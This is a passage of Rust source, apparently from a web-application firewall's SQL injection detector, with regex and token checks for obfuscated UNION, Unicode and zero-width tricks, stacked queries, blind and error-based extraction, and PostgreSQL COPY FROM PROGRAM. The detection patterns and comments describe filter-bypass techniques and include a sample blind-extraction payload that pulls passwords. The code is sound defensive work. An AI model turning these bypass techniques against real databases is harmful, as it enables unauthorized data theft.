                    interpretation: "Input concatenates character literals with || to construct keyword fragments".into(),
                    offset: m.start(),
                    property: "User input must not construct executable SQL keywords via character-wise concatenation".into(),
                }],
            });
        }
        detections
    }

    fn detect_unicode_normalization_sqli(&self, input: &str) -> Vec<L2Detection> {
        static FULLWIDTH_WORD_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"[\u{FF21}-\u{FF3A}\u{FF41}-\u{FF5A}]{2,}").unwrap()
        });
        const SUSPICIOUS: &[&str] = &[
            "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "EXEC", "EXECUTE", "XP_",
            "SP_",
        ];

        let mut detections = Vec::new();
        if !FULLWIDTH_WORD_RE.is_match(input) {
            return detections;
        }

        let normalized: String = input
            .chars()
            .map(|c| {
                let code = c as u32;
                if (0xFF01..=0xFF5E).contains(&code) {
                    char::from_u32(code - 0xFEE0).unwrap_or(c)
                } else {
                    c
                }
            })
            .collect();

        let normalized_upper = normalized.to_uppercase();
        if SUSPICIOUS
            .iter()
            .any(|kw| normalized_upper.contains(kw))
        {
            detections.push(L2Detection {
                detection_type: "unicode_normalization_sqli".into(),
                confidence: 0.85,
                detail: "Full-width Unicode text normalizes to SQL keyword-bearing payload".into(),
                position: 0,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::EncodingDecode,
                    matched_input: input.to_owned(),
                    interpretation: format!(
                        "Unicode normalization reveals SQL payload text: {}",
                        extract_context(&normalized, 0, 80)
                    ),
                    offset: 0,
                    property: "Input must not use Unicode normalization effects to bypass SQL keyword filtering".into(),
                }],
            });
        }
        detections
    }

    fn detect_unicode_smuggling(&self, input: &str) -> Vec<L2Detection> {
        static FULLWIDTH_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"[\u{FF21}-\u{FF5A}\u{FF41}-\u{FF5A}]").unwrap()
        });

        let mut detections = Vec::new();
        if FULLWIDTH_RE.is_match(input) {
            let normalized: String = input
                .chars()
                .map(|c| {
                    let code = c as u32;
                    if code >= 0xFF01 && code <= 0xFF5E {
                        char::from_u32(code - 0xFEE0).unwrap_or(c)
                    } else {
                        c
                    }
                })
                .collect();

            let upper = normalized.to_uppercase();
            if upper.contains("UNION")
                || upper.contains("SELECT")
                || upper.contains("DROP ")
                || upper.contains("SLEEP(")
                || upper.contains("OR 1=1")
            {
                detections.push(L2Detection {
                    detection_type: "unicode_smuggling".into(),
                    confidence: 0.93,
                    detail: "Full-width unicode characters map to SQL payload".into(),
                    position: 0,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::EncodingDecode,
                        matched_input: input.to_owned(),
                        interpretation: format!("Unicode smuggling normalizes to: {}", extract_context(&normalized, 0, 64)),
                        offset: 0,
                        property: "Input must not use visually similar Unicode characters to bypass filters".into(),
                    }],
                });
            }
        }
        detections
    }

    fn detect_scientific_tautology(&self, input: &str) -> Vec<L2Detection> {
        static SCI_TAUT_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)\b(\d+(?:\.\d+)?e[+\-]?\d+)\s*=\s*(\d+(?:\.\d+)?e[+\-]?\d+)\b")
                .unwrap()
        });
        let mut detections = Vec::new();
        for m in SCI_TAUT_RE.captures_iter(input) {
            let val1 = m.get(1).unwrap().as_str();
            let val2 = m.get(2).unwrap().as_str();
            if val1.eq_ignore_ascii_case(val2) {
                let full_match = m.get(0).unwrap();
                detections.push(L2Detection {
                    detection_type: "scientific_tautology".into(),
                    confidence: 0.95,
                    detail: "Tautology using scientific notation (e.g., 1e0=1e0)".into(),
                    position: full_match.start(),
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: full_match.as_str().to_owned(),
                        interpretation: "Input uses scientific notation equality tautology".into(),
                        offset: full_match.start(),
                        property: "Boolean evaluation must not use scientific notation tautologies"
                            .into(),
                    }],
                });
            }
        }
        detections
    }

    fn detect_backtick_keyword_bypass(&self, input: &str) -> Vec<L2Detection> {
        static BACKTICK_UNION_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)`\s*union\s*`\s*`?\s*all\s*`?\s*`?\s*select\s*`|`\s*union\s*`\s*`\s*select\s*`").unwrap()
        });

        let mut detections = Vec::new();
        for m in BACKTICK_UNION_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "backtick_keyword_bypass".into(),
                confidence: 0.90,
                detail: "Backtick-quoted SQL keywords reconstruct UNION SELECT semantics".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SyntaxRepair,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input quotes SQL keywords with MySQL backticks to evade naive keyword filters".into(),
                    offset: m.start(),
                    property: "Injected SQL payloads must not introduce UNION query execution paths".into(),
                }],
            });
        }
        detections
    }

    fn detect_multiline_comment_keyword_split(&self, input: &str) -> Vec<L2Detection> {
        static SPLIT_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)\b(?:u(?:/\*.*?\*/|--[^\n]*\n|#[^\n]*\n)+n(?:/\*.*?\*/|--[^\n]*\n|#[^\n]*\n)+i(?:/\*.*?\*/|--[^\n]*\n|#[^\n]*\n)+o(?:/\*.*?\*/|--[^\n]*\n|#[^\n]*\n)+n|s(?:/\*.*?\*/|--[^\n]*\n|#[^\n]*\n)+e(?:/\*.*?\*/|--[^\n]*\n|#[^\n]*\n)+l(?:/\*.*?\*/|--[^\n]*\n|#[^\n]*\n)+e(?:/\*.*?\*/|--[^\n]*\n|#[^\n]*\n)+c(?:/\*.*?\*/|--[^\n]*\n|#[^\n]*\n)+t)\b").unwrap()
        });

        let mut detections = Vec::new();
        for m in SPLIT_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "comment_keyword_split".into(),
                confidence: 0.91,
                detail: "Keyword letters are split by multi-line or inline comment syntax".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SyntaxRepair,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input uses comment fragments between keyword characters to bypass WAF tokenization".into(),
                    offset: m.start(),
                    property: "Injected SQL payloads must not introduce obfuscated executable SQL keywords".into(),
                }],
            });
        }
        detections
    }

    fn detect_hex_unicode_function_abuse(&self, input: &str) -> Vec<L2Detection> {
        static HEX_FN_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)\b(?:unhex|hex|char|chr)\s*\((?:[^)(]|\([^)]*\))*\)").unwrap()
        });
        static UNICODE_ESCAPE_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)(?:\\u[0-9a-f]{4}|\\x[0-9a-f]{2}){3,}").unwrap()
        });

        let mut detections = Vec::new();
        for m in HEX_FN_RE.find_iter(input) {
            let upper = m.as_str().to_uppercase();
            if upper.contains("UNHEX(") || upper.contains("CHAR(") || upper.contains("CHR(") {
                detections.push(L2Detection {
                    detection_type: "hex_unicode_function".into(),
                    confidence: 0.88,
                    detail: "Hex/character-construction function call is used in SQL payload context".into(),
                    position: m.start(),
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::EncodingDecode,
                        matched_input: m.as_str().to_owned(),
                        interpretation: "Input uses function-based keyword reconstruction (UNHEX/CHAR/CHR) to evade filters".into(),
                        offset: m.start(),
                        property: "User input must not construct executable SQL text via encoding helper functions".into(),
                    }],
                });
            }
        }
        for m in UNICODE_ESCAPE_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "hex_unicode_function".into(),
                confidence: 0.86,
                detail: "Unicode/hex escape sequence chain can reconstruct SQL keywords".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::EncodingDecode,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input carries encoded Unicode/hex escapes commonly decoded into SQL payload text".into(),
                    offset: m.start(),
                    property: "User input must not smuggle executable SQL keywords through escaped Unicode/hex text".into(),
                }],
            });
        }
        detections
    }

    fn detect_numeric_dollar_quoted_payload(&self, input: &str) -> Vec<L2Detection> {
        static NUMERIC_TAG_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"\$(\d{3,})\$").unwrap());

        let mut detections = Vec::new();
        for caps in NUMERIC_TAG_RE.captures_iter(input) {
            let Some(opening) = caps.get(0) else { continue };
            let Some(tag_digits) = caps.get(1) else {
                continue;
            };
            let tag = format!("${}$", tag_digits.as_str());
            let search_start = opening.end();
            let remainder = &input[search_start..];
            let Some(rel_end) = remainder.find(&tag) else {
                continue;
            };
            let close_idx = search_start + rel_end;
            let full_end = close_idx + tag.len();
            let inner = &input[search_start..close_idx];
            let inner_upper = inner.to_uppercase();
            let suspicious = [
                "UNION", "SELECT", "DROP", "INSERT", "UPDATE", "DELETE", "TRUNCATE", "EXECUTE",
                "BEGIN", "END;",
            ]
            .iter()
            .any(|kw| inner_upper.contains(kw));
            if !suspicious {
                continue;
            }

            detections.push(L2Detection {
                detection_type: "numeric_dollar_quote".into(),
                confidence: 0.91,
                detail: "PostgreSQL numeric dollar-quoted payload encloses executable SQL".into(),
                position: opening.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::ContextEscape,
                    matched_input: input[opening.start()..full_end].to_owned(),
                    interpretation: "Input uses numeric dollar tags to hide malicious SQL body from keyword filters".into(),
                    offset: opening.start(),
                    property: "SQL statement boundary must remain single-statement unless explicitly intended".into(),
                }],
            });
        }
        detections
    }

    fn detect_like_wildcard_injection(&self, input: &str) -> Vec<L2Detection> {
        static LIKE_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)\b(?:where|and|or)\b[^;]{0,120}\blike\b\s*(?:n)?'[^']*(?:%|_)[^']*'")
                .unwrap()
        });
        static BOOLEAN_LIKE_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)\b(?:or|and)\b\s+[A-Za-z_][A-Za-z0-9_\.]*\s+like\s+'%[^']*%'")
                .unwrap()
        });

        let mut detections = Vec::new();
        for m in LIKE_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "like_wildcard_injection".into(),
                confidence: 0.84,
                detail: "LIKE wildcard pattern appears in attacker-controlled boolean SQL context".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: extract_context(input, m.start(), 80),
                    interpretation: "Input injects broad wildcard matching to force predicate truthiness or enumerate values".into(),
                    offset: m.start(),
                    property: "User input must not broaden SQL predicates via wildcard-based LIKE manipulation".into(),
                }],
            });
        }
        for m in BOOLEAN_LIKE_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "like_wildcard_injection".into(),
                confidence: 0.87,
                detail: "Boolean-chain LIKE wildcard abuse detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input appends LIKE wildcard clauses through OR/AND chaining".into(),
                    offset: m.start(),
                    property: "User input must not broaden SQL predicates via wildcard-based LIKE manipulation".into(),
                }],
            });
        }
        detections
    }

    fn detect_dbms_stacked_variant_payloads(&self, input: &str) -> Vec<L2Detection> {
        static MSSQL_DECLARE_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is);\s*(?:declare|exec(?:ute)?|waitfor|begin)\b").unwrap()
        });
        static ORACLE_BLOCK_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)\bbegin\b[\s\S]{0,220}\bexecute\s+immediate\b[\s\S]{0,220}\bend\s*;")
                .unwrap()
        });
        static MYSQL_HANDLER_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is);\s*(?:create\s+procedure|handler\s+\w+\s+open|set\s+@)").unwrap()
        });

        let mut detections = Vec::new();
        for m in MSSQL_DECLARE_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "dbms_stacked_variant".into(),
                confidence: 0.90,
                detail: "Stacked-query variant with MSSQL control keywords detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input terminates a statement and starts DBMS control-flow SQL".into(),
                    offset: m.start(),
                    property: "SQL statement boundary must remain single-statement unless explicitly intended".into(),
                }],
            });
        }
        for m in ORACLE_BLOCK_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "dbms_stacked_variant".into(),
                confidence: 0.93,
                detail: "Oracle PL/SQL block with EXECUTE IMMEDIATE indicates stacked execution".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: extract_context(input, m.start(), 120),
                    interpretation: "Input introduces an Oracle anonymous block capable of dynamic SQL execution".into(),
                    offset: m.start(),
                    property: "SQL statement boundary must remain single-statement unless explicitly intended".into(),
                }],
            });
        }
        for m in MYSQL_HANDLER_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "dbms_stacked_variant".into(),
                confidence: 0.88,
                detail: "MySQL stacked-query control-flow payload detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input starts MySQL procedural or session-level control payloads after statement break".into(),
                    offset: m.start(),
                    property: "SQL statement boundary must remain single-statement unless explicitly intended".into(),
                }],
            });
        }
        detections
    }

    fn detect_boolean_blind_extraction(&self, input: &str) -> Vec<L2Detection> {
        static BOOL_EXTRACTION_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)(?:(?:AND|OR|WHERE)\s+)?(?:MID|SUBSTRING|SUBSTR|LEFT|RIGHT|CHAR|ASCII|ORD)\s*\([^(]*\(\s*(?:SELECT\s+\w+\s+FROM|\$\w+|\w+\s*\.\s*\w+)").unwrap()
        });

        let mut detections = Vec::new();
        for m in BOOL_EXTRACTION_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "sql_boolean_blind_extraction".into(),
                confidence: 0.91,
                detail: "Boolean blind SQL injection extracts data character-by-character using conditional responses (true/false) rather than UNION or error output.".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Boolean blind SQL injection extracts data character-by-character using conditional responses (true/false) rather than UNION or error output. AND MID((SELECT password FROM users),1,1) < a is binary-searchable, enabling password extraction without any visible error or UNION keyword".into(),
                    offset: m.start(),
                    property: "SQL queries must use parameterized statements for all user input. Boolean-based blind extraction is undetectable at the network level — only parameterized queries prevent it".into(),
                }],
            });
        }
        detections
    }

    fn detect_boolean_blind_subquery(&self, input: &str) -> Vec<L2Detection> {
        static BOOL_SUBQUERY_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)\b(?:and|or)\b\s+\d+\s*=\s*\(\s*select\s+(?:count|ascii|substring|length|len)\s*\(").unwrap()
        });
        static EXISTS_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)\b(?:and|or)\b\s+(?:exists|not\s+exists)\s*\(\s*select\b").unwrap()
        });

        let mut detections = Vec::new();
        for m in BOOL_SUBQUERY_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "boolean_blind_subquery".into(),
                confidence: 0.92,
                detail: "Boolean blind SQLi pattern using scalar subquery comparison".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: extract_context(input, m.start(), 110),
                    interpretation: "Input adds boolean predicate around subquery aggregates/functions for blind extraction".into(),
                    offset: m.start(),
                    property: "Boolean evaluation of SQL predicates must not depend on attacker-controlled subqueries".into(),
                }],
            });
        }
        for m in EXISTS_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "boolean_blind_subquery".into(),
                confidence: 0.90,
                detail: "Boolean blind SQLi pattern using EXISTS subquery".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input toggles response behavior using EXISTS/NOT EXISTS subqueries".into(),
                    offset: m.start(),
                    property: "Boolean evaluation of SQL predicates must not depend on attacker-controlled subqueries".into(),
                }],
            });
        }
        detections
    }

    fn detect_error_based_extraction_advanced(&self, input: &str) -> Vec<L2Detection> {
        static MYSQL_ERR_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)\b(?:extractvalue|updatexml|polygon|multipolygon|geometrycollection)\s*\([^;]*(?:select|concat|0x7e|@@version|database\(\))").unwrap()
        });

        let mut detections = Vec::new();
        for m in MYSQL_ERR_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "advanced_error_oracle".into(),
                confidence: 0.93,
                detail: "Advanced error-based extraction function pattern detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: extract_context(input, m.start(), 120),
                    interpretation: "Input uses error-raising function composition to leak DB metadata through messages".into(),
                    offset: m.start(),
                    property: "SQL evaluation must not execute attacker-controlled error-reflection functions".into(),
                }],
            });
        }
        detections
    }

    fn detect_json_where_operator_abuse(&self, input: &str) -> Vec<L2Detection> {
        static JSON_WHERE_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)\bwhere\b[^;]{0,220}(?:->>|->|json_extract\s*\(|jsonb_extract_path_text\s*\(|json_value\s*\()").unwrap()
        });
        static JSON_PATH_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?is)(?:->>|json_extract\s*\(|json_value\s*\()[^;]{0,140}(?:\$\.[A-Za-z0-9_]+|'[A-Za-z0-9_]+'|"[A-Za-z0-9_]+")"#).unwrap()
        });

        let mut detections = Vec::new();
        for m in JSON_WHERE_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "json_where_abuse".into(),
                confidence: 0.87,
                detail: "JSON traversal operators/functions used inside WHERE predicate".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: extract_context(input, m.start(), 120),
                    interpretation: "Input injects JSON field traversal in WHERE clauses for hidden predicate abuse".into(),
                    offset: m.start(),
                    property: "User input must not alter WHERE semantics via attacker-controlled JSON traversal paths".into(),
                }],
            });
        }
        for m in JSON_PATH_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "json_where_abuse".into(),
                confidence: 0.84,
                detail: "JSON path extraction chain likely used for conditional SQL abuse".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input uses direct JSON path extraction syntax common in SQLi filter bypass payloads".into(),
                    offset: m.start(),
                    property: "User input must not alter WHERE semantics via attacker-controlled JSON traversal paths".into(),
                }],
            });
        }
        detections
    }

    fn detect_insert_update_manipulation(
        &self,
        input: &str,
        tokens: &[TokTuple],
    ) -> Vec<L2Detection> {
        static ON_DUP_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)\bon\s+duplicate\s+key\s+update\b").unwrap()
        });
        static UPSERT_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)\bon\s+conflict\b[^;]{0,120}\bdo\s+(?:update|nothing)\b").unwrap()
        });
        static UPDATE_EXPR_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)\bupdate\b[^;]{0,140}\bset\b[^;]{0,140}(?:=\s*\(\s*select\b|=\s*concat\s*\(|=\s*[A-Za-z_][A-Za-z0-9_]*\s*\|\|)").unwrap()
        });

        let mut detections = Vec::new();
        for m in ON_DUP_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "insert_update_injection".into(),
                confidence: 0.90,
                detail: "MySQL ON DUPLICATE KEY UPDATE manipulation path detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input introduces write-path mutation logic through ON DUPLICATE KEY UPDATE".into(),
                    offset: m.start(),
                    property: "User input must not alter INSERT/UPDATE write semantics with injected control clauses".into(),
                }],
            });
        }
        for m in UPSERT_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "insert_update_injection".into(),
                confidence: 0.88,
                detail: "UPSERT conflict clause indicates attacker-controlled write-path manipulation".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input modifies write semantics with ON CONFLICT DO UPDATE/NOTHING".into(),
                    offset: m.start(),
                    property: "User input must not alter INSERT/UPDATE write semantics with injected control clauses".into(),
                }],
            });
        }
        for m in UPDATE_EXPR_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "insert_update_injection".into(),
                confidence: 0.86,
                detail: "UPDATE SET expression contains subquery or concatenation injection primitive".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: extract_context(input, m.start(), 120),
                    interpretation: "Input injects dynamic expressions into UPDATE/SET write targets".into(),
                    offset: m.start(),
                    property: "User input must not alter INSERT/UPDATE write semantics with injected control clauses".into(),
                }],
            });
        }

        let meaningful: Vec<_> = tokens
            .iter()
            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
            .collect();
        for i in 0..meaningful.len().saturating_sub(3) {
            if meaningful[i].1.eq_ignore_ascii_case("INSERT")
                && meaningful[i + 1].1.eq_ignore_ascii_case("INTO")
                && meaningful
                    .iter()
                    .skip(i)
                    .take(18)
                    .any(|(_, v, _)| v.eq_ignore_ascii_case("SELECT"))
            {
                detections.push(L2Detection {
                    detection_type: "insert_update_injection".into(),
                    confidence: 0.87,
                    detail: "INSERT ... SELECT pattern detected in attacker-controlled input".into(),
                    position: meaningful[i].2,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: "INSERT INTO ... SELECT".into(),
                        interpretation: "Input converts write query into data-copy/exfiltration capable INSERT SELECT".into(),
                        offset: meaningful[i].2,
                        property: "User input must not alter INSERT/UPDATE write semantics with injected control clauses".into(),
                    }],
                });
                break;
            }
        }

        detections
    }

    fn detect_pg_copy_from_program(&self, input: &str) -> Vec<L2Detection> {
        static COPY_FROM_PROGRAM_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)\bCOPY\b.{0,80}\bFROM\s+PROGRAM\b").unwrap()
        });

        let mut detections = Vec::new();
        for m in COPY_FROM_PROGRAM_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "sql_pg_copy_from_program".into(),
                confidence: 0.94,
                detail: "PostgreSQL COPY FROM PROGRAM OS command execution pattern detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_string(),
                    interpretation: "PostgreSQL COPY FROM PROGRAM executes OS commands and captures output into a table, equivalent to RCE".into(),
                    offset: m.start(),
                    property: "User input must not trigger OS command execution via database primitives".into(),
                }],
            });
        }
        detections
    }

    fn detect_zero_width_bypass(&self, input: &str) -> Vec<L2Detection> {
        static ZERO_WIDTH_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?:\u{200B}|\u{200C}|\u{200D}|\u{FEFF}|\u{2060})").unwrap()
        });
        
        let mut detections = Vec::new();
        if ZERO_WIDTH_RE.is_match(input) {
            let stripped = ZERO_WIDTH_RE.replace_all(input, "").to_string();
            // simple check for SQL keywords in stripped vs original
            let keywords = ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP"];
            for kw in &keywords {
                let kw_upper = kw.to_uppercase();
                let stripped_upper = stripped.to_uppercase();
                let original_upper = input.to_uppercase();
                
                if stripped_upper.contains(&kw_upper) {
                    detections.push(L2Detection {
                        detection_type: "sql_zero_width_bypass".into(),
                        confidence: 0.89,
                        detail: "Zero-width Unicode characters used to obscure SQL keywords".into(),
                        position: 0,
                        evidence: vec![ProofEvidence {
                            operation: EvidenceOperation::EncodingDecode,
                            matched_input: input.to_string(),
                            interpretation: "Zero-width Unicode characters injected between SQL keywords bypass WAF/regex detection while remaining executable by the database engine".into(),
                            offset: 0,
                            property: "User input must not contain zero-width characters intended to bypass keyword filters".into(),
                        }],
                    });
                    break;
                }
            }
        }
        detections
    }

    fn detect_pg_unicode_escape(&self, input: &str) -> Vec<L2Detection> {
        static PG_UNICODE_ESCAPE_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)U&\x27[^\x27]*\x27|U&'[^']*'").unwrap()
        });

        let mut detections = Vec::new();
        for m in PG_UNICODE_ESCAPE_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "sql_pg_unicode_escape".into(),
                confidence: 0.87,
                detail: "PostgreSQL U& Unicode escape string syntax detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::EncodingDecode,
                    matched_input: m.as_str().to_string(),
                    interpretation: "PostgreSQL U& escape string syntax allows encoding SQL keywords as Unicode code points, bypassing keyword detection".into(),
                    offset: m.start(),
                    property: "User input must not utilize alternative database-specific string encodings to bypass filters".into(),
                }],
            });
        }
        detections
    }

    fn detect_bitwise_tautology(&self, input: &str) -> Vec<L2Detection> {
        static BITWISE_TAUTOLOGY_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)\b(?:1\s*[|&^]\s*1\s*=\s*1|1\s*XOR\s*0\s*=\s*1|0\s*XOR\s*0\s*=\s*0|\d+\s*\|\s*\d+\s*=\s*\d+)").unwrap()
        });

        let mut detections = Vec::new();
        for m in BITWISE_TAUTOLOGY_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "sql_bitwise_tautology".into(),
                confidence: 0.82,
                detail: "Bitwise operator tautology detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SemanticEval,
                    matched_input: m.as_str().to_string(),
                    interpretation: "Bitwise operator tautologies (1|1=1, XOR) function as boolean always-true conditions in MySQL, bypassing OR/AND tautology filters".into(),
                    offset: m.start(),
                    property: "User input must not contain boolean always-true expressions using bitwise operators".into(),
                }],
            });
        }
        detections
    }

    fn detect_hex_x_literal(&self, input: &str) -> Vec<L2Detection> {
        static HEX_X_LITERAL_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)\bX'[0-9a-fA-F]{4,}'").unwrap()
        });

        let mut detections = Vec::new();
        for m in HEX_X_LITERAL_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "sql_hex_x_literal".into(),
                confidence: 0.84,
                detail: "Standard SQL hex literal string (X'... ') detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::EncodingDecode,
                    matched_input: m.as_str().to_string(),
                    interpretation: "Standard SQL hex literal syntax X'...' encodes string payloads that databases decode to executable SQL keywords".into(),
                    offset: m.start(),
                    property: "User input must not contain hex-encoded payloads designed to bypass keyword detection".into(),
                }],
            });
        }
        detections
    }

    fn detect_sqlite_pragma(&self, input: &str) -> Vec<L2Detection> {
        static PRAGMA_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)\bPRAGMA\s+(?:table_info|database_list|integrity_check|writable_schema|journal_mode|temp_store|wal_autocheckpoint|foreign_keys|user_version|application_id|secure_delete)\b").unwrap()
        });

        let mut detections = Vec::new();
        for m in PRAGMA_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "sql_sqlite_pragma".into(),
                confidence: 0.88,
                detail: "SQLite PRAGMA command injection detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_string(),
                    interpretation: "SQLite PRAGMA injection discloses schema information and can modify database security settings including foreign key enforcement and write-ahead logging".into(),
                    offset: m.start(),
                    property: "User input must not trigger SQLite internal configuration or schema commands".into(),
                }],
            });
        }
        detections
    }
}

impl L2Evaluator for SqlStructuralEvaluator {
    fn id(&self) -> &'static str {
        "sql_structural"
    }
    fn prefix(&self) -> &'static str {
        "L2 SQL Structural"
    }

    #[inline]

    fn detect(&self, input: &str) -> Vec<L2Detection> {
        let variants = strip_injection_prefix(input);
        let mut all_detections = Vec::new();
        let mut seen = std::collections::HashSet::new();
        let tokenizer = SqlTokenizer;

        for variant in &variants {
            let stream = tokenizer.tokenize(variant);
            let tokens: Vec<TokTuple> = stream
                .all()
                .iter()
                .map(|t| (t.token_type, t.value.clone(), t.start))
                .collect();

            // String termination needs raw input
            for det in self.detect_string_termination(variant, &tokens) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }

            for det in self.detect_union_extraction(&tokens) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_obfuscated_union(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_chr_keyword_construction(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
